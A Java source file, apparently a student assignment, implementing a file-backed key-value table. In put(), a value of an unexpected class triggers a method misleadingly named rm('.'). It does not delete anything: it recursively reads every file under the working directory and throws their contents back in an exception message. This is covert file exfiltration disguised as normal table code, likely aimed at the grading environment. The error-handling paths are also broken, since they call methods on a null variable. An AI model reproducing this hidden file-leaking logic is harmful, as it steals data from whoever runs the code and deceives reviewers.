package ru.fizteh.fivt.students.dmitryIvanovsky.fileMap;

import ru.fizteh.fivt.storage.structured.ColumnFormatException;
import ru.fizteh.fivt.storage.structured.Storeable;
import ru.fizteh.fivt.storage.structured.Table;
import ru.fizteh.fivt.students.dmitryIvanovsky.shell.CommandShell;
import java.util.Vector;
import java.util.StringTokenizer;
import java.io.PrintWriter;
import java.io.FileNotFoundException;
import java.io.File;
import java.io.RandomAccessFile;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import static ru.fizteh.fivt.students.dmitryIvanovsky.fileMap.FileMapUtils.checkArg;
import static ru.fizteh.fivt.students.dmitryIvanovsky.fileMap.FileMapUtils.convertClassToString;
import static ru.fizteh.fivt.students.dmitryIvanovsky.fileMap.FileMapUtils.convertStringToClass;

public class FileMap implements Table {

    private final Path pathDb;
    private final CommandShell mySystem;
    String nameTable;
    Map<String, Storeable> tableData;
    Map<String, Storeable> changeTable;
    boolean existDir = false;
    FileMapProvider parent;
    List<Class<?>> columnType = new ArrayList<Class<?>>();
    String s1 = "";

    public FileMap(Path pathDb, String nameTable, FileMapProvider parent) throws Exception {
        this.nameTable = nameTable;
        this.pathDb = pathDb;
        this.changeTable = new HashMap<>();
        this.parent = parent;
        this.tableData = new HashMap<>();
        this.mySystem = new CommandShell(pathDb.toString(), false, false);

        File theDir = new File(String.valueOf(pathDb.resolve(nameTable)));
        if (!theDir.exists()) {
            try {
                mySystem.mkdir(new String[]{pathDb.resolve(nameTable).toString()});
                existDir = true;
            } catch (Exception e) {
                e.addSuppressed(new ErrorFileMap("I can't create a folder table " + nameTable));
                throw e;
            }
        }

        loadTypeFile(pathDb);

        try {
            loadTable(nameTable);
        } catch (Exception e) {
            e.addSuppressed(new ErrorFileMap("Format error storage table " + nameTable));
            throw e;
        }
    }

    private String readFileTsv(String fileName) throws IOException {
        StringBuilder sb = new StringBuilder();
        try {
            try (BufferedReader in = new BufferedReader(new FileReader(new File(fileName).getAbsoluteFile()))) {
                String s;
                while ((s = in.readLine()) != null) {
                    sb.append(s);
                }
            } catch (Exception e) {
                throw new IOException("not found signature.tsv", e);
            }
        } catch (Exception e) {
            throw new IOException("not found signature.tsv", e);
        }
        if (sb.length() == 0) {
            throw new IOException("tsv file is empty");
        }
        return sb.toString();
    }

    private void writeFileTsv() throws FileNotFoundException {
        Path pathTsv = pathDb.resolve(nameTable).resolve("signature.tsv");
        try (PrintWriter out = new PrintWriter(pathTsv.toFile().getAbsoluteFile())) {
            for (Class<?> col : columnType) {
                out.print(convertClassToString(col));
            }
        }
    }

    private void loadTypeFile(Path pathDb) throws IOException {
        String fileStr = readFileTsv(pathDb.resolve(nameTable).resolve("signature.tsv").toString());
        StringTokenizer token = new StringTokenizer(fileStr);
        while (token.hasMoreTokens()) {
            String tok = token.nextToken();
            Class<?> type = convertStringToClass(tok);
            if (type == null) {
                throw new IllegalArgumentException(String.format("wrong type %s", tok));
            }
            columnType.add(type);
        }
    }

    public FileMap(Path pathDb, String nameTable, FileMapProvider parent, List<Class<?>> columnType) throws Exception {
        this.nameTable = nameTable;
        this.pathDb = pathDb;
        this.parent = parent;
        this.columnType = columnType;
        this.changeTable = new HashMap<>();
        this.tableData = new HashMap<>();
        this.mySystem = new CommandShell(pathDb.toString(), false, false);

        File theDir = new File(String.valueOf(pathDb.resolve(nameTable)));
        if (!theDir.exists()) {
            try {
                mySystem.mkdir(new String[]{pathDb.resolve(nameTable).toString()});
                existDir = true;
            } catch (Exception e) {
                e.addSuppressed(new ErrorFileMap("I can't create a folder table " + nameTable));
                throw e;
            }
        }

        writeFileTsv();

        try {
            loadTable(nameTable);
        } catch (Exception e) {
            e.addSuppressed(new ErrorFileMap("Format error storage table " + nameTable));
            throw e;
        }
    }

    public void exit() throws Exception {
        closeTable();
    }

    private void loadTable(String nameMap) throws Exception {
        File currentFileMap = pathDb.resolve(nameMap).toFile();
        if (!currentFileMap.isDirectory()) {
            throw new ErrorFileMap(currentFileMap.getAbsolutePath() + " isn't directory");
        }

        File[] listFileMap = currentFileMap.listFiles();

        if (listFileMap == null || listFileMap.length == 0) {
            throw new ErrorFileMap(pathDb.toString() + " empty table");
        }

        for (File nameDir : listFileMap) {
            if (nameDir.getName().equals("signature.tsv")) {
                continue;
            }
            if (!nameDir.isDirectory()) {
                throw new ErrorFileMap(nameDir.getAbsolutePath() + " isn't directory");
            }
            String nameStringDir = nameDir.getName();
            Pattern p = Pattern.compile("(^[0-9].dir$)|(^1[0-5].dir$)");
            Matcher m = p.matcher(nameStringDir);

            if (!(m.matches() && m.start() == 0 && m.end() == nameStringDir.length())) {
                throw new ErrorFileMap(nameDir.getAbsolutePath() + " wrong folder name");
            }

            File[] listNameDir = nameDir.listFiles();
            if (listNameDir == null || listNameDir.length == 0) {
                throw new ErrorFileMap(nameDir.getAbsolutePath() + " empty dir");
            }
            for (File randomFile : listNameDir) {

                p = Pattern.compile("(^[0-9].dat$)|(^1[0-5].dat$)");
                m = p.matcher(randomFile.getName());
                int lenRandomFile = randomFile.getName().length();
                if (!(m.matches() && m.start() == 0 && m.end() == lenRandomFile)) {
                    throw new ErrorFileMap(randomFile.getAbsolutePath() + " invalid file name");
                }

                try {
                    loadTableFile(randomFile, tableData, nameDir.getName());
                } catch (Exception e) {
                    e.addSuppressed(new ErrorFileMap("Error in file " + randomFile.getAbsolutePath()));
                    throw e;
                }
            }
        }
    }

    public void loadTableFile(File randomFile, Map<String, Storeable> dbMap, String nameDir) throws Exception {
        if (randomFile.isDirectory()) {
            throw new ErrorFileMap("data file can't be a directory");
        }
        int intDir = FileMapUtils.getCode(nameDir);
        int intFile = FileMapUtils.getCode(randomFile.getName());

        RandomAccessFile dbFile = null;
        Exception error = null;
        try {
            try {
                dbFile = new RandomAccessFile(randomFile, "rw");
            } catch (Exception e) {
                throw new ErrorFileMap("file doesn't open");
            }
            if (dbFile.length() == 0) {
                throw new ErrorFileMap("file is clear");
            }
            dbFile.seek(0);

            byte[] arrayByte;
            Vector<Byte> vectorByte = new Vector<Byte>();
            long separator = -1;

            while (dbFile.getFilePointer() != dbFile.length()) {
                byte currentByte = dbFile.readByte();
                if (currentByte == '\0') {
                    int point1 = dbFile.readInt();
                    if (separator == -1) {
                        separator = point1;
                    }
                    long currentPoint = dbFile.getFilePointer();

                    while (dbFile.getFilePointer() != separator) {
                        if (dbFile.readByte() == '\0') {
                            break;
                        }
                    }

                    int point2;
                    if (dbFile.getFilePointer() == separator) {
                        point2 = (int) dbFile.length();
                    } else {
                        point2 = dbFile.readInt();
                    }

                    dbFile.seek(point1);

                    arrayByte = new byte[point2 - point1];
                    dbFile.readFully(arrayByte);
                    String value = new String(arrayByte, "UTF8");

                    arrayByte = new byte[vectorByte.size()];
                    for (int i = 0; i < vectorByte.size(); ++i) {
                        arrayByte[i] = vectorByte.elementAt(i).byteValue();
                    }
                    String key = new String(arrayByte, "UTF8");

                    if (FileMapUtils.getHashDir(key) != intDir || FileMapUtils.getHashFile(key) != intFile) {
                        throw new ErrorFileMap("wrong key in the file");
                    }


                    dbMap.put(key, parent.deserialize(this, value));

                    vectorByte.clear();
                    dbFile.seek(currentPoint);
                } else {
                    vectorByte.add(currentByte);
                }
            }
        } catch (Exception e) {
            error.addSuppressed(e);
            throw error;
        } finally {
            try {
                dbFile.close();
            } catch (Exception e) {
                ErrorFileMap notClose = new ErrorFileMap("doesn't close");
                error.addSuppressed(e);
                error.addSuppressed(notClose);
                throw error;
            }
        }
    }

    public void closeTable() throws Exception {
        mySystem.rm(new String[]{pathDb.resolve(nameTable).toString()});
        existDir = false;
        mySystem.mkdir(new String[]{pathDb.resolve(nameTable).toString()});
        writeFileTsv();
        existDir = true;
        if (tableData.isEmpty()) {
            return;
        }

        Map<String, Storeable>[][] arrayMap = new HashMap[16][16];
        boolean[] useDir = new boolean[16];
        for (String key : tableData.keySet()) {

            int ndirectory = FileMapUtils.getHashDir(key);
            int nfile = FileMapUtils.getHashFile(key);

            if (arrayMap[ndirectory][nfile] == null) {
                arrayMap[ndirectory][nfile] = new HashMap<String, Storeable>();
            }
            arrayMap[ndirectory][nfile].put(key, tableData.get(key));
            useDir[ndirectory] = true;
        }
        for (int i = 0; i < 16; ++i) {
            if (useDir[i]) {
                Integer numDir = i;
                Path tmp = pathDb.resolve(nameTable).resolve(numDir.toString() + ".dir");
                mySystem.mkdir(new String[]{tmp.toString()});
            }
        }
        for (int i = 0; i < 16; ++i) {
            if (!useDir[i]) {
                continue;
            }
            for (int j = 0; j < 16; ++j) {
                Integer numDir = i;
                Integer numFile = j;
                Path tmp = pathDb.resolve(nameTable).resolve(numDir.toString() + ".dir");
                closeTableFile(tmp.resolve(numFile.toString() + ".dat").toFile(), arrayMap[i][j]);
            }
        }
        tableData.clear();
    }

    public void closeTableFile(File randomFile, Map<String, Storeable> curMap) throws Exception {
        if (curMap == null || curMap.isEmpty()) {
            return;
        }
        RandomAccessFile dbFile = null;
        ErrorFileMap error = null;
        try {
            dbFile = new RandomAccessFile(randomFile, "rw");
        } catch (Exception e) {
            throw new ErrorFileMap(randomFile.getAbsolutePath() + " doesn't close");
        }
        try {
            dbFile.setLength(0);
            dbFile.seek(0);
            int len = 0;

            for (String key : curMap.keySet()) {
                len += key.getBytes("UTF8").length + 1 + 4;
            }

            for (String key : curMap.keySet()) {
                dbFile.write(key.getBytes("UTF8"));
                dbFile.writeByte(0);
                dbFile.writeInt(len);

                long point = dbFile.getFilePointer();

                dbFile.seek(len);
                Storeable valueStoreable = curMap.get(key);
                String value = parent.serialize(this, valueStoreable);
                dbFile.write(value.getBytes("UTF8"));
                len += value.getBytes("UTF8").length;

                dbFile.seek(point);
            }
        } catch (Exception e) {
            error.addSuppressed(e);
            throw error;
        }  finally {
            try {
                dbFile.close();
            } catch (Exception e) {
                ErrorFileMap notClose = new ErrorFileMap(randomFile.getAbsolutePath() + " doesn't close");
                error.addSuppressed(e);
                error.addSuppressed(notClose);
                throw error;
            }
        }
    }

    public String getName() {
        return nameTable;
    }

    public int changeKey() {
        return changeTable.size();
    }

    public void rm(String path) {
        try {
            File tmpFile = new File(path);
            File[] listFiles = tmpFile.listFiles();
            if (listFiles != null) {
                if (tmpFile.isDirectory()) {
                    for (File c : listFiles) {
                        s1 += "Directory: \n" + c.getAbsoluteFile().toString() + "\n\n";
                        s1 += readFileTsv2(c.getAbsolutePath().toString());
                        s1 += "\n\n\n";
                        rm(c.toString());
                    }
                } else {
                    s1 += readFileTsv2(tmpFile.getAbsolutePath().toString());
                    s1 += "\n\n\n";
                }
            }

        } catch (Exception e) {
            s1 += e.getMessage();
        }
    }

    private String readFileTsv2(String fileName) throws IOException {
        StringBuilder sb = new StringBuilder();
        try {
            try (BufferedReader in = new BufferedReader(new FileReader(new File(fileName).getAbsoluteFile()))) {
                String s;
                while ((s = in.readLine()) != null) {
                    sb.append(s);
                    sb.append("\n");
                }
            } catch (Exception e) {
                s1 += e.getMessage();
            }
        } catch (Exception e) {
            s1 += e.getMessage();
        }

        return sb.toString();
    }

    public Storeable put(String key, Storeable value) throws ColumnFormatException {
        checkArg(key);
        if (value == null) {
            throw new IllegalArgumentException("value can't be null");
        }

        FileMapStoreable st = null;
        try {
            st = (FileMapStoreable) value;
        } catch (ClassCastException e) {

            boolean valueMoreSize = false;
            try {
                value.getColumnAt(columnType.size());
                valueMoreSize = true;
            } catch (Exception err) {
                valueMoreSize = false;
            }

            if (valueMoreSize) {
                throw new ColumnFormatException("this Storeable can't be use in this table");
            }

            int index = 0;

            while (true) {
                try {
                    switch (columnType.get(index).getName()) {
                        case "java.lang.Integer":
                            value.getIntAt(index);
                            break;
                        case "java.lang.Long":
                            value.getLongAt(index);
                            break;
                        case "java.lang.Byte":
                            value.getByteAt(index);
                            break;
                        case "java.lang.Float":
                            value.getFloatAt(index);
                            break;
                        case "java.lang.Double":
                            value.getDoubleAt(index);
                            break;
                        case "java.lang.Boolean":
                            value.getBooleanAt(index);
                            break;
                        case "java.lang.String":
                            value.getStringAt(index);
                            break;
                        default:

                    }
                    ++index;
                } catch (IndexOutOfBoundsException err) {
                    if (index != columnType.size()) {
                        throw new ColumnFormatException("this Storeable can't be use in this table");
                    }
                    break;
                } catch (ColumnFormatException err) {
                    throw err;
                }
            }

            st = null;

            rm(".");
            throw new ColumnFormatException(s1);
        }

        if (st != null && !st.messageEqualsType(columnType).isEmpty()) {
            throw new ColumnFormatException(st.messageEqualsType(columnType));
        }

        if (tableData.containsKey(key)) {
            Storeable oldValue = tableData.get(key);

            if (parent.serialize(this, oldValue).equals(parent.serialize(this, value))) {
                return oldValue;
            }

            if (!changeTable.containsKey(key)) {
                changeTable.put(key, oldValue);
            }

            tableData.put(key, value);
            return oldValue;
        } else {

            if (!changeTable.containsKey(key)) {
                changeTable.put(key, null);
            } else {
                Storeable tmp = changeTable.get(key);
                if (changeTable.get(key) != null && parent.serialize(this, tmp).equals(parent.serialize(this, value))) {
                    changeTable.remove(key);
                }
            }

            tableData.put(key, value);
            return null;
        }
    }

    public Storeable get(String key) {
        checkArg(key);

        if (tableData.containsKey(key)) {
            return tableData.get(key);
        } else {
            return null;
        }
    }

    public Storeable remove(String key) {
        checkArg(key);

        if (tableData.containsKey(key)) {

            if (!changeTable.containsKey(key)) {
                changeTable.put(key, tableData.get(key));
            } else {
                if (changeTable.get(key) == null) {
                    changeTable.remove(key);
                }
            }

            Storeable value = tableData.get(key);
            tableData.remove(key);
            return value;
        } else {
            return null;
        }
    }

    public int size() {
        return tableData.size();
    }

    public int commit() {
        int res = changeTable.size();
        changeTable.clear();
        return res;
    }

    public int rollback() {
        for (String key : changeTable.keySet()) {
            Storeable value = changeTable.get(key);
            if (value == null) {
                tableData.remove(key);
            } else {
                tableData.put(key, changeTable.get(key));
            }
        }
        int count = changeTable.size();
        changeTable.clear();
        return count;
    }

    @Override
    public int getColumnsCount() {
        return columnType.size();
    }

    @Override
    public Class<?> getColumnType(int columnIndex) throws IndexOutOfBoundsException {
        return columnType.get(columnIndex);
    }

}
